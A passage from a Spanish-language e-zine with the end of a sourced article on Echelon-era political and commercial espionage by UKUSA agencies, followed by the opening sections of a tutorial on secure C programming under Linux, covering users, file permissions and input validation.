-concretamente, a su enlace en Ottawa- que llevara a cabo la observacion,
durante 3 semanas, a cargo de los arcas del estado britanico. El director de
la CSE, Frank Bowman, se desplazo a Londres para dirigir personalmente la
investigacion. Al finalizar esta, recibio ordenes de entregar las cintas a un
oficial del GHCQ en su cuartel general [43].

[43] "Spyworld: How CSE spies on Canadians and the World" ("Mundo espia: como
la CSE espia a los canadienses y al mundo"). Mike Frost y Michael Graton.
Toronto: Seal / McClelland-Bantam, 1.995. pp. 234-238.
http://www.bookexpress.com/prd.i/pgen/BookExpress/0L/ [SIGUE]
display.book.html;isbn=0770427073

	El uso de la alianza UKUSA como tapadera legal es de una tremenda
facilidad. En palabras del coautor de Spyworld, Michael Gratton:

	"El episodio de Thatcher muestra sin lugar a dudas que el GHCQ, al
igual que la NSA, encontro la forma de burlar las leyes, y no dudo en
involucrarse directamente para ayudar a un politico concreto en busca de su
beneficio politico personal (...). Probablemente, la decision de llevar a
cabo el "trabajito" de Londres no fue llevada a los responsables en la escala
burocratica. Probablemente la CSE queria hacer un trabajo limpio, que no
quiso dificultar con problemas burocraticos." [44]

[44] idem, p. 238

	Frost tambien relata que en 1.975 se le pidio que espiaran un
objetivo algo peculiar: Margaret Trudeau, esposa del Primer Ministro Pierre
Trudeau. La division del Servicio de Seguridad de la Real Policia Montada de
Canada (RCMP, Royal Canadian Mounted Police) decia saber que la esposa del
Primer Ministro adquiria y consumia marihuana, asi que encargaron el trabajo
sucio a la CSE. Tras meses de observacion en cooperacion con el Servicio de
Seguridad, no se descubrio nada. Frost sospecho que habia motivaciones
politicas detras de esa peticion: "Bajo ninguna circunstancia era ella
sospechosa de espionaje. ¿Por que la RCMP nos habia pedido esto? ¿Intentaban
sacar los trapos sucios de la Sra. Trudeau, o acaso protegerla? ¿Tal vez
recibian ordenes de sus superiores politicos?" [45].

[45] idem, pp. 93-97.

	La NSA suele intervenir tambien en el espionaje politico. John
Ehrlichmann, ayudante del presidente Nixon, publico sus memorias, "Witness to
Power: The Nixon Years" ("Testigo del poder: la Era Nixon"), en las que
revela que Henry Kissinger uso la NSA para interceptar los mensajes del
entonces Secretario de Estado William P. Rogers, que despues Kissinger usaria
para convencer a Nixon de la incompetencia de Rogers. Asimismo, Kissinger
tambien fue espiado por la red de la NSA. A oidos de otros oficiales de la
Administracion Nixon llegarian negociaciones secretas con otros gobiernos;
obviamente, esta informacion perjudico a Kissinger. Segun palabras del
anterior Director Suplente de la NSA William Colby, "aquello debio dolerle
mucho, porque Kissinger deseaba mantenerlo en secreto" [46].

[46] "Catching Americans in NSA's Net" ("Cazando americanos en la red de la
NSA"). Scott Shane y Tom Bowman. Baltimore Sun, 12 de diciembre de 1.995.

	Sea como sea, muchos representantes electos han sido espiados por las
agencias de inteligencia. En 1.988, Margaret Newsham, antigua administradora
de software de Lockheed responsable de 12 maquinas VAX que trabajaban en
Menwith Hill para Echelon, declaro que habia sido testigo de intervenciones
en tiempo real por parte de la NSA de conversaciones telefonicas del senador
de Carolina del Sur, Strom Thurmond. Newsham fue despedida de Lockheed a raiz
de unas declaraciones en las que tildaba a su empresa de "derrochadora y
llena de abusos". Tras una reunion de alto secreto en abril de 1.988 con el
entonces presidente del Comite Permanente la Camara de Investigacion de
Inteligencia, el republicano Louis Stokes, parte del personal de Menwith Hill
cercano a esta reunion filtro informacion al diario Cleveland Plain Dealer
[47]. El senador Thurmond se mostraba reacio a impulsar una investigacion
sobre este asunto, y al mismo tiempo su oficina revelo que habian recibido
informes de la NSA en la que Thurmond figuraba como objetivo de esta agencia
[48]. Las noticias desencadenaron una investigacion que revelo que no habia
controles sobre quien introducia los objetivos en Menwith Hill [49].

[47] "Security Agency Accused of Monitoring U.S. Calls" ("Agencia de
seguridad acusada de monitorizar llamadas en estados unidos"). Keith C.
Epstein y John S. Long. Cleveland Plain Dealer, 1 de julio de 1.988.
pp. 1A, 10A.

[48] "NSA accused of forbidden phone taps" ("La NSA, acusada de escuchas
telefonicas ilegales"). Pete Carey. San Jose Mercury News, 2 de julio de
1.988, p. 1A.
http://
newslibrary.krmediastream.com/cgi-bin/document/sj?DBLIST=sj88&DOCNUM=60407

[49] "Somebody's Listening" ("Alguien escucha"). Duncan Campbell
(http://www.gn.apc.org/duncan/). The New Statesman, 12 de agosto de 1.998,
p. 11.
http://jya.com/echelon-dc.htm

	La NSA, siguiendo ordenes de la Administracion Reagan, espio tambien
al congresista de Maryland Michael Barnes. Sus llamadas telefonicas a
politicos nicaraguenses se interceptaron y grabaron, entre ellas una
conversacion que tuvo con el Ministro de Asuntos Exteriores de aquel pais
protestando por su aplicacion de la ley marcial en Nicaragua. Barnes fue
consciente del espionaje del que era victima cuando empleados de la Casa
Blanca filtraron transcripciones de estas conversaciones a la prensa. El
director de la CIA William Cassey, mas tarde implicado en acciones contra
Iran, mostro a Barnes un cablegrama de la embajada nicaraguense acerca de un
encuentro entre personal de la embajada y uno de los asistentes de Barnes. El
asistente habia viajado a Nicaragua por motivos profesionales en ese pais, y
Cassey solicitaba que fuera despedido, a lo que Barnes respondio que era
legal y legitimo que su personal se reuniera con diplomaticos extranjeros.

	En palabras de Barnes: "Yo sabia que la NSA monitorizaba llamadas
internacionales, que era la rutina en los servicios de inteligencia. Pero
utilizarlas con fines politicos en nuestra nacion es totalmente inaceptable,
y probablemente ilegal" [50]. Otro antiguo dirigente del Comite de
Inteligencia del Senado tambien expreso su opinion sobre el espionaje
nacional de la NSA; son las declaraciones del antiguo senador de Arizona
Dennis DeConcini: "Siempre me ha preocupado. ¿Que pasa si lo utilizan sobre
ciudadanos estadounidenses? Es escalofriante. ¿Estan espiando mis
conversaciones privadas por telefono?" [51].

[50] "Catching Americans in NSA's Net". Ver nota [46].

[51] idem.

	Al parecer organizaciones de prestigio estudian Echelon con detalle,
segun informes confidenciales de antiguos oficiales del GHCQ al diario London
Observer en junio de 1.992. Entre las organizaciones que nombraron figuraban
Amnistia Internacional, Greenpeace y Ayuda Cristiana, un grupo misionero
americano que trabaja con pastores indigenas cercanos a sacerdotes de paises
cristianos occidentales [52].

[52] "UK: GCHQ Spies on Charities and Companies - Fearful Whistleblowers Tell
of Massive Routine Abuse" ("Reino Unido: el GHCQ espia a empresas y
asociaciones beneficas. Declaraciones desesperadas hablan de abusos masivos
rutinarios"). John Merrit. London Observer, 18 de junio de 1.992.

	En otra historia publicada por el London Observer, un antiguo
empleado del Comite de Inteligencia Colectiva Britanica, Robin Robison,
admitio que Margaret Thatcher habia ordenado personalmente la intercepcion de
las comunicaciones de la compañia madre del Observer, Lonrho, despues de que
el diario revelara que en 1.989 se habia sobornado al hijo de Thatcher, Mark,
con un contrato de armas britanicas para Arabia Saudi, por valor de miles de
millones de dolares. A pesar de los cargos a los que se enfrento por haber
violado sus votos de juramento, Robison confeso haber entregado personalmente
en la oficina de la Sra. Thatcher los mensajes interceptados a Lonrho [53].

[53] "Thatcher Ordered Lonrho Phone-Tap Over Harrods Affairs" ("Thatcher
ordeno pinchar las lineas de Lonrho por el caso Harrods"). Hugh
O'Shaughnessy. London Observer, 28 de junio de 1.992. Citado en Secret
Power, p. 54 (http://www.fas.org/irp/eprint/sp/index.html).

	No deberia sorprender que Echelon se acabe convirtiendo en una
herramienta en manos de los gobernantes para su beneficio politico, o por los
propios servicios de inteligencia para conservar y aumentar el poder que
tienen y mantener sus inflados presupuestos. La disponibilidad de tan
poderosa tecnologia casi suplica que se la utilice para el abuso, aunque esto
no justifica tal uso. Pero lo preocupante es que se califique de
"subversivos" precisamente a aquellos que denuncian las corruptas actividades
del gobierno, protegen los derechos humanos de la invasion estatal, desafian
a los corruptos o predican evangelios. Es un hecho que el alcance del
servicio de inteligencia estadounidense deberia limitarse en favor de
organizaciones legitimas y pacificas, no ya por la monitorizacion de la NSA,
sino por sus deseos de control.


4.3. Espionaje comercial
--------------------------


	Ante el rapido desgaste del imperio sovietico a principios de los
noventa, los servicios de inteligencia de paises occidentales necesitaban
redefinir sus objetivos para justificar el alcance de sus sistemas de
espionaje global. Corporaciones cercanas a estos servicios les dieron pronto
la solucion: el espionaje comercial. EEUU redefinio este termino para incluir
el espionaje de empresas competidoras de corporaciones nacionales, lo que ha
endurecido el juego de la inteligencia, y es probablemente la causa de los
estudios a Echelon por parte de la Union Europea.

	La actividad de espionaje comercial y politico en beneficio propio
por parte de los paises de UKUSA comenzo con la caida del comunismo; pero la
NSA, por su parte, tiene un largo historial de practicas de este tipo. Gerald
Burke, que fue Director Ejecutivo de la Junta Consultiva de Inteligencia
Extranjera del presidente Nixon, revelo que el espionaje comercial se inicio
en EEUU en 1.970: "Por lo general, recomendamos que en lo sucesivo se
considerara la inteligencia economica como objetivo de seguridad nacional,
dandole la misma prioridad que a la inteligencia diplomatica, militar y
tecnologica" [54].

[54] "The Hill" ("La colina"). Comunicados, canal 4 de la BBC, 6 de octubre
de 1.993 (transcripcion disponible por Duncan Campbell).

	Para suplir la necesidad de informacion sobre tratos comerciales
internacionales, los servicios de inteligencia abrieron una pequeña division
dentro del Departamento de Comercio, el Enlace de la Oficina de Inteligencia.
En este lugar se reciben los informes de los servicios de inteligencia
estadounidenses sobre contratos internacionales que se estan negociando, y
estos informes se envian discretamente a empresas que lo solicitan o que
pueden estar interesadas en ellos. Inmediatamente despues de subir al poder
en 1.993, el presidente Bill Clinton se sumo a la cruzada del espionaje
comercial creando el Consejo Economico Nacional, que informa a ciertas
compañias estadounidenses para potenciar la competitividad de la nacion. La
capacidad de espionaje comercial de Echelon no es nada nuevo, pero Clinton la
ha convertido en todo un arte:

  - En 1.990 la revista alemana Der Speigel revelo que la NSA habia
    interceptado mensajes sobre un trato pendiente de 200 millones de
    dolares entre Indonesia y el fabricante japones de satelites NEC
    Corp. Tras la intervencion de Bush en las negociaciones, en favor de
    los fabricantes norteamericanos, el contrato se dividio entre NEC y
    AT&T.

  - En 1.994 la CIA y la NSA interceptaron llamadas telefonicas entre
    diplomaticos brasileños y la firma francesa Thomson-CSF sobre un
    sistema de radar que los brasileños querian comprar. Por la venta
    competia una empresa de EEUU, Raytheon, a la que se pasaron los
    informes derivados de las intercepciones [55].

  - En septiembre de 1.993, el presidente Clinton pidio a la CIA que espiara
    fabricantes de automoviles japoneses que querian diseñar coches sin
    emisiones, y que los informes fueran enviados a las tres grandes
    compañias del sector en EEUU: Ford, General Motors y Chrysler [56].
    En 1.995 el New York Times publico que la NSA y la base en Tokyo de
    la CIA eran responsables de haber informado al equipo de negociadores
    del Representante de Comercio de EEUU, Mickey Kantor, que se
    encontraba en Genova enfrentandose a fabricantes japoneses por un
    contrato [57]. Recientemente, el diario japones Mainichi acuso a la
    NSA de seguir espiando a las empresas japonesas en beneficio de las
    norteamericanas [58].

  - La revista Insight Magazine informo, en una serie de articulos en 1.997,
    de que el presidente Clinton ordeno a la NSA y el FBI llevar a cabo
    una operacion de espionaje masivo en la Conferencia Economica de Asia
    y el Pacifico (APEC, Asian/Pacific Economic Conference) en 1.993, que
    se celebro en Seattle. Una fuente de inteligencia contaba que unas
    300 habitaciones de hotel habian sido intervenidas para ello, a fin
    de obtener informacion para contratos pendientes con Vietnam sobre
    combustibles y asuntos hidroelectricos; esta informacion se pasaria
    despues a empresas contribuyentes del Partido Democrata interesadas
    en competir por los contratos [59]. Pero no solo se perjudico a las
    compañias extranjeras: cuando Vietnam se mostro interesada en
    adquirir dos aviones de carga 737 de segunda mano -compra que se
    disponia a realizar a un hombre de negocios norteamericano- y el
    Secretario de Comercio Ron Brown acordo la financiacion de dos Boeing
    737 nuevos, la primera venta se perdio [60].

[55] "Battling High-Tech Warriors" ("Luchadores de alta tecnologia
enfrentados"). Tom Bowman y Scott Shane. Baltimore Sun, 15 de diciembre de
1.995.

[56] "Company Spies" ("Espias de las empresas", pero tambien "Las empresas
espian"). Robert Dreyfuss. Mother Jones, mayo / junio de 1.994.
http://www.mojones.com/mother_jones/MJ94/dreyfuss.html

[57] Citado en "Trolling for Secrets: Economic Espionage is the New Niche for
Government Spies" ("Buscando secretos: el espionaje economico es la nueva
postura de los espias del gobierno"). Bruce Livesley. Financial Post (Canada)
28 de febrero de 1.998.

[58] "US spy agency helped US companies win business overseas" ("La agencia
de espionaje de EEUU ayudo a compañias estadounidenses a hacer negocios al
otro lado del oceano"). Nikkei English News, 21 de septiembre de 1.998.
http://www.euronet.nl/~rembert/echelon/jap2109.htm

[59] "Did Clinton Bug Conclave for Cash" ("¿Intervino Clinton el conclave por
razones economicas?"). Timothy W. Maier. Insight, 15 de septiembre de 1.997.
http://www.insightmag.com/investiga/apec1.html .
La serie de 3 articulos se puede consultar en
http://www.insightmag.com/investiga/apecindex.html

[60] "Snoops, Sex and Videotapes" ("Sexo, fisgones y cintas de video").
Timothy W. Maier. Insight, 29 de septiembre de 1.997.
http://www.insightmag.com/investiga/apec2.html

	Pero EEUU no es el unico pais de UKUSA que se dedica a estas
actividades. La Primera Ministra britanica Margaret Thatcher ordeno al GHCQ
que siguiera al magnate de los medios internacionales Robert Maxwell para
beneficiar al Banco de Inglaterra [61]. La antigua lingüista y analista de la
CSE Jane Sorteen dijo haber sido testigo de intercepciones a representantes
de negocios mejicanos durante las negociaciones con NAFTA en 1.992-93, asi
como al Ministro de Asuntos Exteriores koreano en 1.991 en referencia a la
construccion de 3 reactores nucleares canadienses CANDU para los koreanos,
por valor de 6 billones de dolares [62]. Mejico protesto por ello, por lo que
se solicito a la Primera Ministra Suplente de Canada Sheila Copps que
presentara pruebas al respecto.

[61] "Cook Faces Quiz on Big Brother Spy Net" ("[El ministro] Cook
interrogado sobre la red de espionaje del Gran Hermano"). Matthew Fletcher.
Financial Mail (Inglaterra), 1 de marzo de 1.998.
http://www.financialmail.co.uk/dynamic/business/story.html?p_story_id=5280

[62] Citado en "Trolling for Secrets". Ver nota [57]

	Pero todos los servicios de inteligencia acaban cayendo en las redes
de los demas. En Spyworld, Mike Frost cuenta como al intervenir
accidentalmente una llamada por telefono movil del Embajador estadounidense
en Canada en 1.981, durante la negociacion de un contrato de trigo entre EEUU
y China, esto puso en manos de los canadienses la oferta estadounidense,
siendo estos desbancados por parte de Canada, que consiguio un contrato por 3
años y 2'5 billones de dolares para la Canadian Wheat Board. La CSE volvio a
superar a la NSA cuando, un año despues, Canada se hizo con otro contrato del
mismo tipo con Mejico, por 50 millones de dolares [63].

[63] "Spyworld", pp. 224-227. Ver nota [43]

	Otro punto inquietante sobre el uso actual de Echelon es la relacion
entre los servicios de inteligencia y las empresas que hacen posible su
tecnologia. Muchas de las compañias que son informadas de las comunicaciones
interceptadas -Lockheed, Boeing, Loral, TRW, Raytheon- estan implicadas
activamente en el desarrollo de los sistemas de espionaje que impulsan
Echelon. Esta alianza puede tener consecuencias inimaginables, simplemente
por como atenta contra la libre competencia internacional o nacional.
Asimismo, constituye un fraude cometido a costa de fondos publicos y un abuso
de poder por parte de las agencias de inteligencia.


============
5. EPÍLOGO
============


	En tanto que la alianza UKUSA es fruto de tensiones politicas y
militares durante la Guerra Fria, Echelon es puramente un producto del siglo
XX y de la lucha de gobiernos y corporaciones por hacerse con el poder, a
costa de violar los derechos constitucionales de los ciudadanos del mundo.
Los sistemas anteriores a Echelon tenian su justificacion en equilibrar la
balanza de poder ante los avances de la antigua Union Sovietica. Pero, como
ha apuntado Glyn Ford, representante del Parlamento Europeo desde Manchester
(Inglaterra), y las fuerzas que llevan a cabo las investigaciones sobre
Echelon en Europa, "El problema es que la tecnologia ha avanzado tanto que lo
que al principio era una pequeña lista de objetivos estrategicamente elegidos
se ha convertido en todo el planeta" [64].

[64] "Suddenly there came a tapping..." ("De pronto hubo un pinchazo en la
linea"). Lucille Redmond. Diario irlandes The Sunday Business Post, 9 de
marzo de 1.998.
http://www.sbpost.ie/archives/08-03-1998/technology/tap.html

	Lo que empezo como un noble pacto en favor de las libertades en el
mundo, manteniendo el equilibrio de poderes, se ha convertido en una carta
blanca para pisotear los derechos de los ciudadanos del mundo libre. Como se
ha demostrado una y otra vez, la NSA no muestra reparos en infringir las
leyes sobre espionaje, y segun los intereses de los politicos de Washington
se reinterpretan o sortean estas leyes, en detrimento del ciudadano de a pie.
Ya se sabe, mala hierba nunca muere.

	Como ya se ha expuesto, es posible que sea necesaria la tecnologia de
espionaje. El mundo, nos guste o no, esta plagado de delincuentes,
traficantes, terroristas y dictadores que son una amenaza para muchos paises.
La idea de que sus actos puedan ser suavizados por proyectos como Echelon es
esperanzadora. Pero los defensores del Proyecto argumentan que sus victorias
-que son la excepcion- les dan completo derecho a espiar indiscriminadamente
a cada persona o corporacion presuntamente inocente del mundo.

	El espionaje, desvergonzado e ilegal, de oponentes politicos,
competidores comerciales, disidentes o incluso evangelistas demuestra que, si
queremos mantener nuestra Libertad, debemos atar a estos sistemas y a sus
dirigentes con la cadena de la transparencia.
 
	En EEUU es un hecho que no se informa al Congreso de los abusos que
se estan produciendo (o este no es capaz de evitarlos). El Parlamento Europeo
esta ahora debatiendo que es Echelon, como esta siendo utilizado y si los
paises libres deberian usar sistemas como este. Los norteamericanos deberian
entrar tambien en el debate, entendiendo las consecuencias que tendria para
ellos no prestarle la debida atencion. Ya hace 20 años el senador
estadounidense Frank Church lo advertia a sus ciudadanos:

	"Al mismo tiempo, esa capacidad podria en cualquier momento volverse
contra los americanos, y entonces ningun americano tendria ningun tipo de
privacidad, pues tal es la capacidad de monitorizarlo todo: llamadas de
telefono, telegramas... no importa. No habria lugar donde esconderse. Si este
gobierno se llegara a convertir en una tirania, si un dictador tomara el
poder en este pais, el potencial tecnologico que los servicios de
inteligencia han dado al gobierno haria posible extender al tirania al mundo
entero, y no habria forma de luchar por evitarlo, puesto que todos los
esfuerzos por unirse contra el gobierno, no importa cuan en secreto se
hiciera, estan dentro del alcance del gobierno. Tal es la capacidad de este
sistema".


Pope
(pope@netsearch-ezine.com)



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x14 ]-==================================================================
=-[ NetSearch Ezine #5 ]-====================================================
=-[ Programacion segura en C bajo Linux ]-===================================
=-[ por Sp4rK ]-=============================================================




Este texto  contiene una version  formateada y un poco  retocada de un  trabajo
que he tenido  que hacer en  este mismo año. Se trata de una  introduccion a la
programacion segura en C bajo Linux.

A simple  vista se podria caer en el error  de pensar que se ha traducido  cual
quier documento  sobre programacion  segura que anda por  la red.  Por poner un
ejemplo, el Secure Programming HOWTO (citado en la bibliografia).  Sin embargo,
esto no es asi. Pocos documentos contrastan teoria con ejemplos practicos. Este
es uno de ellos.

He intentado  hacer una recopilacion  y explicacion de los errores  de programa
cion mas comunes utilizando el metodo  explicacion_del_problema->ejemplo->demos
tracion->solucion  porque creo que es uno de los mas aclaratorios y,  a la vez,
util.

Espero que os sea de ayuda.

Un saludo,
Sp4rK <sp4rk@netsearch-ezine.com>


-----------------------------------------------------------------------------
*** INDICE GENERAL

0.      INTRODUCCION
0.1.    ¿Que es la seguridad informatica?
0.2.    Sobre este trabajo

1.      LINUX

2.      USUARIOS
2.1.    El Superusuario
2.2.    Grupos y usuarios

3.      PERMISOS
3.1.    Permisos especiales
3.2.    Propiedades de los permisos

4.      VALIDAR TODA ENTRADA DE DATOS

5.      VERIFICAR LOS VALORES DEVUELTOS

6.      RACE CONDITIONS
6.1.    Introduccion
6.2.    Condiciones "no atomicas"
6.2.1.  Demostracion
6.2.2.  Soluciones

7.      VARIABLES DE ENTORNO
7.1.    Introduccion
7.2.    Demostracion: system()
7.3.    Soluciones

8.      BUFFER OVERFLOWS
8.1.    Introduccion
8.2.    El concepto de pila
8.3.    Funcionamiento de un programa bajo Linux
8.4.    Desbordamientos de pila
8.4.1.  Introduccion
8.4.2.  Demostracion
8.5.    Segmento de codigo
8.6.    Shellcodes
8.7.    Ejecucion de codigo arbitrario
8.8.    Soluciones

9.      FORMAT STRING OVERFLOWS

10.     SITUACION ACTUAL DE LA SEGURIDAD INFORMATICA

11.     CONCLUSIONES

BIBILIOGRAFIA
APENDICE A: Glosario
APENDICE B: Direcciones de interes
APENDICE C: Codigo
-----------------------------------------------------------------------------



*** 0. INTRODUCCION

**  0.1. ¿Que es la seguridad informatica?

De acuerdo  con Garfinkel y  Spafford,  "Una computadora es  segura si se puede
confiar en que, junto con sus programas, funcione como se espera."[0]

La seguridad  informatica cubre campos  tan diversos como la criptografia,  los
virus, las redes  y la programacion segura.

Es este ultimo punto en el que se basa este trabajo, pues es uno de los pilares
de la seguridad  de un sistema,  y quizas el mas olvidado por las empresas,  ya
que se tiende  a confiar demasiado en la combinacion firewall-proxy,  olvidando
el factor mencionado antes.


**  0.2. Sobre este trabajo

Este trabajo trata la programacion segura en lenguaje C y bajo el sistema opera
tivo Linux.

La eleccion se ha basado en que este sistema  operativo esta sufriendo una gran
expansion en estos ultimos anyos y su codigo esta basado  al 99% en el lenguaje
C (el 1% restante, es lenguaje ensamblador).

Si bien existe  abundante informacion sobre programacion bajo Linux,  no es tan
ta la relacionada  con la programacion segura. Mas dificil aun, es encontrar in
formacion detallada que contraste ejemplos practicos con soluciones.

Todos los ejemplos han sido escritos para este proposito y no han sido copiados
de ningun otro trabajo,  a menos que se indique lo contrario.  En tal caso,  se
incluiria una referencia al documento del que proviene.


[0] Simon GARFINKEL, Gene SPAFFORD. Practical Unix & Internet Security, p.5.
[1] Todos los ejemplos son aplicables a cualquier sistema operativo basado en
    Unix




*** 1. LINUX

En 1991, Linus Torvalds,  un estudiante de la universidad de Helsinki,  decidio
aprender como funcionaba su equipo recien adquirido, que contaba con un procesa
dor 386. Para ello, escogio el sistema operativo Minix y decidio empezar a desa
rrollar uno nuevo.

Tal como decia Linus Torvalds en un mail el 25 de Agosto de 1991 escrito al gru
po de noticias comp.os.minix:

"I'm doing a (free) operating system  (just a hobby, won't be big and professio
nal like gnu)  for 386(486) AT clones.  This has been brewing since april,  and
is starting to get ready."

Ni siquiera el mismo imaginaba que, anyos mas tarde,Linux llegaria a crecer tan
to como lo ha hecho hasta ahora,  gracias a la colaboracion desinteresada de mi
les de programadores de todo el mundo.[2]

Actualmente, Linux es todo un robusto sistema operativo, clon de Unix, de libre
distribucion, que esta licenciado bajo GPL  (GNU Public License (Licencia Publi
ca GNU)). Algunas de sus funcionalidades son:


- Multitarea: permite ejecutar varios procesos de manera que parece que realmen
  te estan funcionando a la vez.

- Multiusuario: permite usar varios usuarios con permisos diferentes trabajando
  a la vez en una misma maquina.

- Multiprocesador:  puede utilizar uno  o varios procesadores a la vez,  aprove
  chando la potencia que esto nos brinda.

- Soporte de comunicacion interna entre procesos: permite compartir datos entre
  procesos que corran en una misma maquina o a traves de una conexion externa.
  (IPC, sockets unix, BSD sockets).

- Soporte para un gran numero de dispositivos: Linux tiene un gran soporte para 
  todo tipo de hardware.

- Soporte para muchos tipos de sistemas de archivos:  puede trabajar con muchos
  sistemas de archivos diferentes (ext2, FAT, VFAT, AFS, FFS, UFS...)

- Gestion de senyales: Mecanismos para controlar procesos.

Linux es, ante todo, un sistema operativo muy completo y rapido. Y que cada vez 
esta ganando mas adeptos  (ya sea por la calidad enfrente a otros productos del
mercado o por su creciente popularidad).




*** 2. USUARIOS

Linux es un sistema multiusuario. Esto quiere decir que varios usuarios diferen
tes pueden usar el mismo ordenador a la vez, utilizando entornos muy distintos.

Por ejemplo: un usuario podria estar usando el entorno grafico y trabajando con 
GIMP para crear una imagen,  mientras que otro, a su vez, estaria utilizando la 
shell (modo texto) para enviar un mensaje de correo electronico.[3]

Esto nos da una vision de la potencia que tienen los sistemas operativos multiu
suario.


**  2.1. El Superusuario

Para administrar el sistema existe un usuario creado con este fin. Se trata del
superusuario (root).  Es quien tiene todos los privilegios. Puede borrar y leer
cualquier archivo, cambiar cualquier permiso, y dar de alta nuevos usuarios.

El es quien establece el control entre usuarios y quien decide que cosas pueden
hacer, y cuales no.


**  2.2. Grupos y usuarios

Todo usuario bajo Linux esta  asociado bajo un nombre y un digito de identifica
cion de usuario llamado UID  (User Identification Digit). Estos usuarios sirven
para delimitar que recursos pueden utilizar. En el capitulo 3, veremos como fun
ciona todo esto.

Ademas del UID, existen los llamados grupos. Los grupos sirven para "agrupar" a
una serie de usuarios  en un conjunto al que se  aplican diferentes reglas. Tam
bien se identifican por un digito, llamado GID (Group Identification Digit).

Supongamos que tenemos cinco usuarios: Vicente, Jose, Daniel, Eduardo y Javier.
Los tres primeros (Vicente, Jose y Daniel)  trabajan como webmasters y los 2 ul
timos (Eduardo y Javier)  son programadores.  Por lo que,  si bien son usuarios
normales y por eso,  en un principio,  tendran los mismos  permisos sobre todos
los archivos,  nos interesara que solo los webmasters puedan acceder al directo
rio donde se guardan las paginas del servidor http y que solo los programadores puedan acceder al directorio donde se guardan los proyectos.

Para esto se crearian los grupos "webmasters" y "programadores". Se asociaria a 
Vicente, Jose y Daniel al primer grupo, y a Eduardo y Javier al segundo.  Luego
se daria  permisos especificos para  que pudieran trabajar  con los directorios
mencionados anteriormente de manera que no hubiera posibilidad de interferir en
tre ellos.


[2] Se puede obtener mas informacion sobre la historia de linux en:
    http://www.li.org/linuxhistory.php
[3] The GIMP es un software de retoque fotografico y edicion de imagenes para
    Linux, al estilo de Photoshop, de codigo abierto y totalmente gratuito. Se
    puede descargar de http://www.gimp.org




*** 3. PERMISOS

Los permisos son propiedades  de los recursos que delimitan el uso que puede ha
cerse de ellos. Es decir,  propiedades aplicadas a archivos,  directorios, enla
ces, etc.

Cada archivo tiene 3 bloques diferentes a los que aplicar estos permisos:

- Usuario: Designa los permisos a aplicar al usuario que es el amo del archivo.
- Grupo:   Designa los permisos a aplicar al grupo al que pertenece el archivo.
- Mundo:   Designa los permisos a aplicar a todos aquellos usuarios que no son
           el usuario ni forman parte del grupo al que pertenece el archivo.

Se ha adoptado una nomenclatura numerica especial para definir los permisos aso
ciados a cada uno de los bloques que componen los permisos de un archivo:

 Permisos:

             _L_ _E_ _X_    _L_ _E_ _X_    _L_ _E_ _X_
            |   |   |   |  |   |   |   |  |   |   |   |
            `---^---^---'  `---^---^---'  `---^---^---'
               USUARIO         GRUPO          MUNDO
                                                           L: Lectura
                                                           E: Escritura
                                                           X: Ejecucion

Los 3 bloques tienen las mismas caracteristicas  (lectura/escritura/ejecucion),
que pueden estar  activadas o no. De cada bloque,  el primer bit es de lectura,
el segundo es el de escritura y el tercero, el de ejecucion.

Archivo: ns06.txt
Permisos:
           _L_ _E_ _X_    _L_ _E_ _X_    _L_ _E_ _X_
          | 1 | 1 | 0 |  | 1 | 0 | 0 |  | 1 | 0 | 0 |
          `---^---^­--'  `---^---^---'  `---^---^---'
                  (1 representa "bit activado". 0 representa "bit desactivado")


Estos permisos se representan numericamente de forma octal (en base 8), y el pa
so es de binario a octal. De la siguiente manera:

Permiso asociado al:

                 .---------------------------------------.
                 |  USUARIO        GRUPO         MUNDO   |
       .-------- + ------------------------------------- +
       | BINARIO |   1 1 0         1 0 0          1 0 0  |
       | DECIMAL |     6             4              4    |
       | OCTAL   |     6             4              4    |
       `---------+---------------------------------------'

Con esto, se obtiene el permiso 644.  El usuario puede leer y escribir (110), y
el grupo y el mundo tan solo pueden leer el contenido del archivo (1 0 0).


**  3.1. Permisos especiales

Ademas de los permisos de lectura, escritura y ejecucion, existen unos permisos especiales. Estos son:

 Permisos:

             _L_ _E_ _X_    _L_ _E_ _X_    _L_ _E_ _X_
            |   |   |   |  |   |   |   |  |   |   |   |
            `---^---^---'  `---^---^---'  `---^---^---'
               USUARIO         GRUPO          MUNDO
                                                           L: Lectura
                                                           E: Escritura
                         _SU_ _SG_ _ST_                    X: Ejecucion
  Permisos especiales:  |    |    |    |
                        |____|____|____|
                                                           SU: Setuid
                                                           SG: Setgid
                                                           ST: Sticky

De hecho, el permiso 644 es realmente 0644, solo que se omite el bit especial.


**  3.2. Propiedades de los permisos

Si bien,  por su nombre, estos permisos son bastante explicativos en si mismos,
la funcion real que desempenyan es diferente segun el contexto. Es decir, si se
aplican a un archivo  definen unas propiedades y si son aplicados  a un directo
rio, definen propiedades diferentes.

En el caso de archivos normales:

  - Bit setuid: Si el archivo es ejecutado, se modifica el EUID del proceso (Di
    gito de Identificacion de Usuario Efectivo) con el valor del UID (Digito de
    Identificacion del Usuario) que lo posee.

  - Bit setgid: Si el archivo es ejecutado, se modifica el EGID del proceso (Di
    gito de Identificacion de Grupo Efectivo)  con el valor del GID  (Digito de
    Identificacion de Grupo) al que pertenece.

  - Bit sticky: Obsoleto.

  - Bit lectura:  Permite la lectura del contenido del archivo al elemento* que
    se aplique.

  - Bit escritura:  Permite la escritura en el archivo al elemento* que se apli
    que.

  - Bit ejecucion:  Permite la ejecucion  del archivo al elemento*  que se apli
    que.
                                *se entiende elemento por [usuario|grupo|mundo]

Es importante  entender el concepto de los permisos en Linux,  porque el primer
fallo que se puede  cometer es dejar  un archivo que  contenga  datos sensibles 
(como por ejemplo el archivo de contrasenyas) abierto a todo el mundo.




*** 4. VALIDAR TODA ENTRADA DE DATOS

Cuando un programa debe tratar con datos provenientes de fuentes no confiables,
es muy importante validar absolutamente todos y cada uno de los datos.

Los pasos mas importantes a seguir en la creacion de un programa de estas carac
teristicas son:

    Antes de escribirlo:
        * Decidir que es lo que se va a aceptar  teniendo siempre en cuenta que
          estos datos pueden tener un significado especial segun el contexto en
          el que se apliquen (datos escritos en HTML para los scripts CGI es un 
          buen ejemplo).


    Una vez escrito:
        * Verificar que, por defecto, no se acepta ningun dato.
        * Verificar que solo son aceptados  aquellos datos que son conformes al
          formato que nosotros hemos elegido.


A veces, no solo es importante decidir el formato de los datos, sino tambien de
cidir la longitud maxima de estos (e incluso la minima).

Lo mejor es seguir el siguiente consejo:

"Lo que no esta explicitamente permitido, esta prohibido"




